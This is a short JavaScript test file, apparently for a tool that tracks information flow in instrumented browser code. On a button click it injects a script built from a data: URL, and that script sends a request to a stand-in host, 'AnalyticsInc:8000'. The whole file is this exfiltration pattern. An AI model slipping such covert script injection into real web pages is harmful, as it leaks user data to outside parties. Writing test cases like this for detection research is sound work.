// exfil_test_data1.js
function exfiltrate_key_history() {
  var data$$18 = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=data1", true);xmlhttp.send(null);';
  var URL = "data:text/javascript;," + encodeURIComponent(data$$18);
  var script = document.createElement("script");
  script.src = URL;
  var v1 = document.getElementsByTagName("head")[0];
  JAM.call(v1.appendChild, v1, [script]);
  return;
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)
